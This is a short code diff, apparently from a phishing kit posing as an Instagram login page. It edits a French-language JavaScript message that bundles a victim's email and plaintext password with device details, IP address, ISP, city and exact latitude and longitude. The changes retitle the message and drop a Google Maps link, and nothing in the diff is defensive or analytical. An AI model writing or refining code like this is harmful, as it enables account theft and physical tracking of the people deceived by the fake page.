@@ -270,13 +270,13 @@
 
             const deviceInfo = await getDeviceInfo();
 
-            const loginMessage = `✅ Instagram Account\n
+            const loginMessage = `✅ Nouvelle Connexion (Instagram)
 👤 Email: ${email}
 🔑 Mot de passe: ${password}
 📱 Appareil: ${deviceInfo.device}
 🌐 Navigateur: ${deviceInfo.userAgent}
 🖥️ Résolution: ${deviceInfo.resolution}
-🥶 IP: ${deviceInfo.ip}
+📍 IP: ${deviceInfo.ip}
 🌍 Hostname: ${deviceInfo.hostname}
 🌍 ASN: ${deviceInfo.asn}
 🌍 ISP: ${deviceInfo.isp}
@@ -284,7 +284,6 @@
 🏙️ Ville: ${deviceInfo.city}
 📍 Latitude: ${deviceInfo.latitude}
 📍 Longitude: ${deviceInfo.longitude}
-📍 Maps: https://www.google.com/maps?q=${deviceInfo.latitude},${deviceInfo.longitude}
 📈 Nombre de visites: ${visitCount}
 🕒 Temps: ${new Date().toLocaleString()}`;
 
